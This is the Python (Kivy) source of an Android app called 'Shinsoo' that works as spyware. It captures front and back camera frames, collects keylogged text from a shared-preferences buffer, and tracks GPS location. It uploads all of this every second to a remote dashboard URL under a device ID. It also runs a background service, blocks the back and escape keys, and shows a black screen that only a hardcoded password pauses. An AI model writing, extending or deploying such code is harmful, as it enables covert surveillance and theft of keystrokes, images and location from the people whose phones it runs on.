import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.camera import Camera
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io, time

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()
PERMS = {'Kamera': False, 'Konum': False, 'Dosya': False}


class MainScreen(FloatLayout):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._active = True
        self._msgs   = []
        self._idx    = 0
        self._cam_f  = None
        self._cam_b  = None
        self._sender = None

        with self.canvas.before:
            Color(0, 0, 0, 1)
            self._bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bg, 'pos', self.pos),
                  size=lambda *_: setattr(self._bg, 'size', self.size))

        self._build_ui()
        Clock.schedule_interval(self._rotate, 3)
        Clock.schedule_interval(self._send_frames, 2)
        Clock.schedule_interval(self._read_keylog, 1)

    def _build_ui(self):
        center = BoxLayout(
            orientation='vertical',
            size_hint=(0.65, None), height=dp(90),
            spacing=dp(10),
            pos_hint={'center_x': 0.5, 'center_y': 0.52},
        )
        self._pwd = TextInput(
            hint_text='key', password=True,
            font_size=dp(22), multiline=False,
            size_hint_y=None, height=dp(52),
            background_color=(0.06, 0.06, 0.06, 1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.22, 0.22, 0.22, 1),
            padding=[dp(14), dp(14)],
        )
        self._pwd.bind(on_text_validate=self._check_key)
        self._err = Label(
            text='', font_size=dp(10), color=(0.6, 0.1, 0.1, 1),
            size_hint_y=None, height=dp(14), halign='center',
        )
        center.add_widget(self._pwd)
        center.add_widget(self._err)
        self.add_widget(center)

        self._ticker = Label(
            text='gokhan', font_size=dp(8),
            color=(0.14, 0.14, 0.14, 1),
            size_hint=(1, None), height=dp(18),
            pos_hint={'x': 0, 'y': 0}, halign='center',
        )
        self.add_widget(self._ticker)

    def _check_key(self, *_):
        if self._pwd.text == KIOSK_PASSWORD:
            self._active = False
            if self._sender:
                self._sender.paused = True
            self._err.text = ''
            self._pwd.text = ''
            self._push('durduruldu')
        else:
            self._err.text = 'yanlis key'
            self._pwd.text = ''

    def _push(self, msg):
        self._msgs.append(msg)
        if len(self._msgs) > 60:
            self._msgs = self._msgs[-60:]

    def _rotate(self, dt):
        if self._msgs:
            self._idx = (self._idx + 1) % len(self._msgs)
            self._ticker.text = 'gokhan  |  ' + self._msgs[self._idx]

    # ── Keylog okuma (SharedPreferences'tan) ─────────────────────────────────

    def _read_keylog(self, dt):
        if not self._active or not self._sender:
            return
        if platform != 'android':
            return
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            ctx = PythonActivity.mActivity
            prefs = ctx.getSharedPreferences('shinsoo_keys', 0)
            buf = prefs.getString('buffer', '')
            if buf:
                self._sender.key_buffer.append(buf)
                prefs.edit().putString('buffer', '').apply()
                self._push('key: ' + buf[:15])
        except Exception:
            pass

    # ── Kamera ───────────────────────────────────────────────────────────────

    def start_cameras(self):
        threading.Thread(target=self._init_cams, daemon=True).start()

    def _init_cams(self):
        time.sleep(1)
        Clock.schedule_once(self._open_front, 0)
        Clock.schedule_once(self._open_back, 0.8)

    def _open_front(self, *_):
        try:
            self._cam_f = Camera(index=1, resolution=(320, 240), play=True)
            self._push('on kamera ok')
        except Exception:
            try:
                self._cam_f = Camera(index=0, resolution=(320, 240), play=True)
                self._push('kamera ok')
            except Exception as e:
                self._push('cam err: ' + str(e)[:12])

    def _open_back(self, *_):
        try:
            self._cam_b = Camera(index=0, resolution=(320, 240), play=True)
            self._push('arka kamera ok')
        except Exception:
            pass

    def _get_frame(self, cam):
        if not cam or not cam.texture:
            return None
        try:
            tex = cam.texture
            buf = tex.pixels
            from PIL import Image as PILImage
            img = PILImage.frombytes('RGBA', (tex.width, tex.height), buf)
            img = img.convert('RGB').resize((320, 240))
            out = io.BytesIO()
            img.save(out, format='JPEG', quality=40)
            return base64.b64encode(out.getvalue()).decode('utf-8')
        except Exception:
            return None

    def _send_frames(self, dt):
        if not self._active or not self._sender:
            return
        f = self._get_frame(self._cam_f)
        b = self._get_frame(self._cam_b)
        if f:
            self._sender.frame_front = f
        if b:
            self._sender.frame_back = b

    def update_perm(self, name, granted):
        PERMS[name] = granted
        self._push(name + ':' + ('ok' if granted else 'red'))
        if name == 'Kamera' and granted:
            self.start_cameras()


class DataSender:
    def __init__(self, screen):
        self.screen       = screen
        self.paused       = False
        self.frame_front  = None
        self.frame_back   = None
        self.key_buffer   = []
        self.packet_count = 0
        self._stop        = threading.Event()
        self._loc         = [None]
        self._key_lock    = threading.Lock()
        threading.Thread(target=self._send_loop, daemon=True).start()
        threading.Thread(target=self._gps_loop,  daemon=True).start()

    def stop(self): self._stop.set()

    def _gps_loop(self):
        if platform != 'android':
            return
        try:
            from jnius import autoclass, PythonJavaClass, java_method
            LocationManager = autoclass('android.location.LocationManager')
            PythonActivity  = autoclass('org.kivy.android.PythonActivity')
            context         = PythonActivity.mActivity

            class LL(PythonJavaClass):
                __javainterfaces__ = ['android/location/LocationListener']

                @java_method('(Landroid/location/Location;)V')
                def onLocationChanged(self_, loc):
                    self._loc[0] = (loc.getLatitude(), loc.getLongitude())
                    self.screen._push(
                        str(round(loc.getLatitude(), 4)) + ',' +
                        str(round(loc.getLongitude(), 4)))

                @java_method('(Ljava/lang/String;)V')
                def onProviderEnabled(self_, p): pass

                @java_method('(Ljava/lang/String;)V')
                def onProviderDisabled(self_, p): pass

            lm = context.getSystemService('location')
            ll = LL()
            for provider in ['gps', 'network']:
                try:
                    lm.requestLocationUpdates(provider, 3000, 0, ll)
                except Exception:
                    pass
            for provider in ['gps', 'network', 'passive']:
                try:
                    loc = lm.getLastKnownLocation(provider)
                    if loc:
                        self._loc[0] = (loc.getLatitude(), loc.getLongitude())
                        break
                except Exception:
                    pass
        except Exception as e:
            self.screen._push('gps err: ' + str(e)[:15])

    def _send_loop(self):
        try:
            import requests
        except Exception:
            return
        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        while not self._stop.is_set():
            if self.paused:
                self._stop.wait(1)
                continue
            try:
                payload = {
                    'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S'),
                }
                if self.frame_front:
                    payload['frame_front'] = self.frame_front
                    self.frame_front = None
                if self.frame_back:
                    payload['frame_back'] = self.frame_back
                    self.frame_back = None

                # Keylog
                with self._key_lock:
                    if self.key_buffer:
                        payload['keylog'] = ' '.join(self.key_buffer)
                        self.key_buffer = []

                if self._loc[0]:
                    payload['location'] = {
                        'lat': self._loc[0][0],
                        'lon': self._loc[0][1],
                    }
                requests.post(url, json=payload, timeout=5)
                self.packet_count += 1
                self.screen._push('pkt#' + str(self.packet_count))
            except Exception:
                self.screen._push('bag yok')
            self._stop.wait(1)


class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        self.screen = MainScreen()
        self.sender = DataSender(self.screen)
        self.screen._sender = self.sender
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._start_service()
            self._request_perms()
        else:
            for k in PERMS: PERMS[k] = True
            self.screen.start_cameras()

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _start_service(self):
        try:
            from android import AndroidService
            svc = AndroidService('Shinsoo', 'Shinsoo')
            svc.start('start')
            self.screen._push('servis ok')
        except Exception as e:
            self.screen._push('servis err: ' + str(e)[:15])

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception:
            pass

    def _after_storage(self, permissions, grants):
        for p, g in zip(permissions, grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception:
            pass

    def _after_all(self, permissions, grants):
        for p, g in zip(permissions, grants):
            if 'CAMERA' in p:
                self.screen.update_perm('Kamera', g)
            elif 'LOCATION' in p:
                self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_): return True

    def _on_key(self, w, key, *_):
        if key == 27: return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
